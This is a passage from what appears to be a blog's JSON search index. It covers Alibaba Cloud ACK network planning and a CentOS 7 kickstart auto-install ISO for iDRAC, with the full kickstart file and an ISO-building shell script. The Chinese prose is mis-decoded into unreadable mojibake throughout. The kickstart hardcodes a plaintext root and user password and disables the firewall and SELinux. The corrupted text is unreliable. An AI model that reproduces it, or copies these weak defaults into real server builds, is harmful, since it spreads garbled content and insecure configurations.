CIDRï¼šä¸ºç»Ÿä¸€èµ·è§ï¼Œ10.240.0.0/20\u003c/p\u003e\n\u003cp\u003eservice CIDRï¼šä¸ºç»Ÿä¸€èµ·è§ï¼Œ192.168.240.0/20\u003c/p\u003e\n\u003cp\u003eæ³¨æ„ä»¥ä¸Š å»ºç«‹å¥½äº†ä¸‰ä¸ªç½‘æ®µï¼Œä¸‰ä¸ªç½‘æ®µä¸­å‡æœ‰240å­—æ®µï¼Œä¾¿äºè®°å¿†\u003c/p\u003e\n\u003cp\u003e\u003c!-- raw HTML omitted --\u003eECS(2å°)ï¼š172.19.240.0/20\u003c/p\u003e\n\u003cp\u003ePODç½‘æ®µï¼š10.240.0.0/20\u003c/p\u003e\n\u003cp\u003eServiceç½‘æ®µï¼š192.168.240.0/20 \u003c!-- raw HTML omitted --\u003e\u003c/p\u003e\n\u003cp\u003eâ€‹\u003c/p\u003e\n\u003cp\u003eèŠ‚ç‚¹IPæ•°é‡ï¼š256ï¼ŒæŒ‡å•ä¸ªèŠ‚ç‚¹å¯è¿è¡Œ Pod æ•°é‡çš„ä¸Šé™ã€‚ \u003cstrong\u003eä¸€å®šè¦æ‹‰åˆ°æœ€å¤§é‡256\u003c/strong\u003e ï¼Œå¼„åˆ°16çš„è¯ï¼Œä¸€ä¸ªèŠ‚ç‚¹æœ¬èº«è¦è·‘10å¤šä¸ªsystemçš„podï¼Œå°±æ— æ³•è·‘åº”ç”¨podäº†ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211026131504133\" loading=\"lazy\" src=\"/posts/20211026-ack_build/image-20211026131504133.png\"\u003e\u003c/p\u003e","title":"é˜¿é‡Œäº‘ACKå®Œå…¨ç”Ÿäº§ç¯å¢ƒè§„åˆ’å’Œæ­å»º"},{"content":"ä¹‹å‰ä»‹ç»è¿‡å¦‚ä½•åˆ¶ä½œä¸€ä¸ª centos live cdrom ç³»ç»Ÿ\né‚£ä¹ˆï¼ŒæŸäº›æƒ…å†µä¸‹æˆ‘ä»¬å¯èƒ½æ— æ³•å¼„ä¸€ä¸ª pxe ç³»ç»Ÿï¼Œè€Œåªèƒ½é€šè¿‡ idrac æŒ‚è½½ iso çš„æ–¹å¼å®‰è£…ç³»ç»Ÿ\nè¯¥å¦‚ä½•å»åšå‘¢ï¼Ÿ\næ­¥éª¤å¦‚ä¸‹ï¼š\nä¸€ã€ä¸‹è½½Centosçš„minimalå®‰è£…å…‰ç›˜ wget http://mirrors.163.com/centos/7.9.2009/isos/x86_64/CentOS-7-x86_64-Minimal-2009.iso yum install -y mkisofs äºŒã€å‡†å¤‡kickstartå®‰è£…æ–‡ä»¶ ä¸‹è½½ï¼š centos7.ks\ntext skipx install auth --useshadow --enablemd5 authconfig --enableshadow --passalgo=sha512 firstboot --disable keyboard us lang en_US.UTF-8 reboot cdrom firewall --disable selinux --disabled services --enabled=\u0026#34;chronyd\u0026#34; logging level=info #ignoredisk --only-use=vda ignoredisk --only-use=sda #bootloader --location=mbr --append=\u0026#34;net.ifnames=0 biosdevname=0 crashkernel=auto\u0026#34; bootloader --location=mbr --append=\u0026#34;crashkernel=auto\u0026#34; rootpw --plaintext Renren2021! timezone Asia/Shanghai --isUtc network --device=lo --hostname=localhost.localdomain user --name=supdev --gid=511 --groups=\u0026#34;supdev\u0026#34; --uid=511 --password=\u0026#34;Renren2021!\u0026#34; zerombr clearpart --all --initlabel part biosboot --fstype=biosboot --size=1 part /boot --fstype ext4 --size=2048 part swap --asprimary --size=8192 part / --fstype ext4 --size=1 --grow #part biosboot --fstype=biosboot --size=1 #part /boot --fstype ext2 --size 250 #part pv.01 --size 1 --grow #volgroup vg pv.01 #logvol / --vgname=vg --size=1 --grow --fstype ext4 --fsoptions=discard,noatime --name=root #logvol /tmp --vgname=vg --size=1024 --fstype ext4 --fsoptions=discard,noatime --name=tmp #logvol swap --vgname=vg --recommended --name=swap #uefi #partition /boot/efi --asprimary --fstype=vfat --label EFI --size=200 #partition /boot --asprimary --fstype=ext4 --label BOOT --size=500 #partition / --asprimary --fstype=ext4 --label ROOT --size=4096 --grow services --enabled=network reboot %pre parted -s /dev/sda mklabel gpt %end %packages @core @system-admin-tools @additional-devel @virtualization-client @virtualization-platform @virtualization-tools libguestfs-tools-c perl-Sys-Virt qemu-guest-agent qemu-kvm-tools curl dstat expect openssl initscripts ipmitool lrzsz lsof mtools nc nmap perl perl-CPAN procps python screen sysstat systemtap systemtap-client systemtap-devel tcpdump telnet vim wget wsmancli zip chrony kexec-tools net-tools ntp ntpdate man acpid chrony telnet %end ä¸‰ã€å‡†å¤‡ç”Ÿæˆisoçš„è„šæœ¬ ä¸‹è½½ï¼š makeiso.sh\n#!/bin/bash rm -rf /tmp/bootiso /tmp/bootcustom /tmp/boot.iso mkdir /tmp/bootiso mount -o loop CentOS-7-x86_64-Minimal-2009.iso /tmp/bootiso mkdir /tmp/bootcustom cp -r /tmp/bootiso/* /tmp/bootcustom umount /tmp/bootiso rmdir /tmp/bootiso chmod -R u+w /tmp/bootcustom cp centos7.ks /tmp/bootcustom/isolinux/ks.cfg sed -i \u0026#39;/menu\\ default/d\u0026#39; /tmp/bootcustom/isolinux/isolinux.cfg sed -i \u0026#39;s/^timeout\\ .*/timeout 10/g\u0026#39; /tmp/bootcustom/isolinux/isolinux.cfg sed -i \u0026#39;/^label\\ linux/i label\\ kickstart\u0026#39; /tmp/bootcustom/isolinux/isolinux.cfg sed -i \u0026#39;/^label\\ linux/i \\ \\ menu\\ label\\ ^Install\\ Using\\ Kickstart\\ CentOS 7\u0026#39; /tmp/bootcustom/isolinux/isolinux.cfg sed -i \u0026#39;/^label\\ linux/i \\ \\ menu\\ default\u0026#39; /tmp/bootcustom/isolinux/isolinux.cfg sed -i \u0026#39;/^label\\ linux/i \\ \\ kernel\\ vmlinuz\\ biosdevname=0\u0026#39; /tmp/bootcustom/isolinux/isolinux.cfg sed -i \u0026#39;/^label\\ linux/i \\ \\ append\\ initrd=initrd.img\\ ks=cdrom:\\/ks.cfg\u0026#39; /tmp/bootcustom/isolinux/isolinux.cfg sed -i \u0026#39;/^label\\ linux/i \\\\n\u0026#39; /tmp/bootcustom/isolinux/isolinux.cfg cd /tmp/bootcustom mkisofs -o /tmp/boot.iso -b isolinux.bin -c boot.cat -no-emul-boot -boot-load-size 4 -boot-info-table -V \u0026#34;CentOS 7 x86_64\u0026#34; -R -J -v -T isolinux/. . ç”Ÿæˆçš„è‡ªåŠ¨å®‰è£…å…‰ç›˜æ–‡ä»¶åœ¨ /tmp/boot.iso ï¼Œåœ¨ idrac ä¸­ mount å‡ºæ¥ï¼Œå°±å¯ä»¥ç”¨ virtual CD-ROM è‡ªåŠ¨å®‰è£…äº†\n","permalink":"https://rendoumi.com/posts/20211025-autoinstall_cd/","summary":"\u003cp\u003eä¹‹å‰ä»‹ç»è¿‡å¦‚ä½•åˆ¶ä½œä¸€ä¸ª \u003ca href=\"../20211010-live_cd/\"\u003ecentos live cdrom\u003c/a\u003e ç³»ç»Ÿ\u003c/p\u003e\n\u003cp\u003eé‚£ä¹ˆï¼ŒæŸäº›æƒ…å†µä¸‹æˆ‘ä»¬å¯èƒ½æ— æ³•å¼„ä¸€ä¸ª pxe ç³»ç»Ÿï¼Œè€Œåªèƒ½é€šè¿‡ idrac æŒ‚è½½ iso çš„æ–¹å¼å®‰è£…ç³»ç»Ÿ\u003c/p\u003e\n\u003cp\u003eè¯¥å¦‚ä½•å»åšå‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eæ­¥éª¤å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003ch2 id=\"ä¸€ä¸‹è½½centosçš„minimalå®‰è£…å…‰ç›˜\"\u003eä¸€ã€ä¸‹è½½Centosçš„minimalå®‰è£…å…‰ç›˜\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget http://mirrors.163.com/centos/7.9.2009/isos/x86_64/CentOS-7-x86_64-Minimal-2009.iso\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install -y mkisofs\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"äºŒå‡†å¤‡kickstartå®‰è£…æ–‡ä»¶\"\u003eäºŒã€å‡†å¤‡kickstartå®‰è£…æ–‡ä»¶\u003c/h2\u003e\n\u003cp\u003eä¸‹è½½ï¼š \u003ca href=\"centos7.ks\"\u003ecentos7.ks\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003etext\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eskipx\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003einstall\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eauth  --useshadow  --enablemd5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eauthconfig --enableshadow --passalgo\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003esha512\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efirstboot --disable\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ekeyboard us\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003elang en_US.UTF-8\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ereboot\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ecdrom\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efirewall --disable\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eselinux  --disabled\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eservices --enabled\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;chronyd\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003elogging level\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003einfo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#ignoredisk --only-use=vda\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eignoredisk --only-use\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003esda\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#bootloader --location=mbr --append=\u0026#34;net.ifnames=0 biosdevname=0 crashkernel=auto\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ebootloader --location\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003embr --append=\u0026#34;crashkernel=auto\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003erootpw --plaintext Renren2021!\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003etimezone Asia/Shanghai --isUtc\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enetwork  --device\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003elo --hostname=localhost.localdomain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003euser --name\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003esupdev --gid=511 --groups=\u0026#34;supdev\u0026#34; --uid=511 --password=\u0026#34;Renren2021!\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ezerombr\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eclearpart --all --initlabel \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003epart biosboot --fstype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003ebiosboot --size=1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003epart /boot --fstype ext4 --size\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e2048 \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003epart swap  --asprimary   --size\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e8192\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003epart /     --fstype ext4 --size\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e1 --grow\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#part biosboot --fstype=biosboot --size=1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#part /boot --fstype ext2 --size 250\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#part pv.01 --size 1 --grow\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#volgroup vg pv.01\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#logvol / --vgname=vg --size=1 --grow --fstype ext4 --fsoptions=discard,noatime --name=root\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#logvol /tmp --vgname=vg --size=1024 --fstype ext4 --fsoptions=discard,noatime --name=tmp\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#logvol swap --vgname=vg --recommended --name=swap\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#uefi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#partition /boot/efi --asprimary --fstype=vfat --label EFI  --size=200\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#partition /boot     --asprimary --fstype=ext4 --label BOOT --size=500\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#partition /         --asprimary --fstype=ext4 --label ROOT --size=4096 --grow\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eservices --enabled\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003enetwork\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ereboot\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e%pre\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eparted -s /dev/sda mklabel gpt\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e%end\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e%packages\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e@core\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e@system-admin-tools\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e@additional-devel\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e@virtualization-client\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e@virtualization-platform\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e@virtualization-tools\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003elibguestfs-tools-c\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eperl-Sys-Virt\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eqemu-guest-agent\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eqemu-kvm-tools\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ecurl\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003edstat\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eexpect\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eopenssl\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003einitscripts\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eipmitool\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003elrzsz\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003elsof\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003emtools\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enc\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enmap\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eperl\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eperl-CPAN\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eprocps\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003epython\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003escreen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esysstat\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esystemtap\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esystemtap-client\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esystemtap-devel\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003etcpdump\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003etelnet\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003evim\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ewget\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ewsmancli\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ezip\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003echrony\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ekexec-tools\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet-tools\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003entp\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003entpdate\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eman\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eacpid\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003echrony\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003etelnet\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e%end\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"ä¸‰å‡†å¤‡ç”Ÿæˆisoçš„è„šæœ¬\"\u003eä¸‰ã€å‡†å¤‡ç”Ÿæˆisoçš„è„šæœ¬\u003c/h2\u003e\n\u003cp\u003eä¸‹è½½ï¼š \u003ca href=\"makeiso.sh\"\u003emakeiso.sh\u003c/a\u003e\u003c/p\u003e","title":"Centos auto install cdromè‡ªåŠ¨å®‰è£…cdromçš„åˆ¶ä½œ"},{"content":"ä¸ºäº†ç 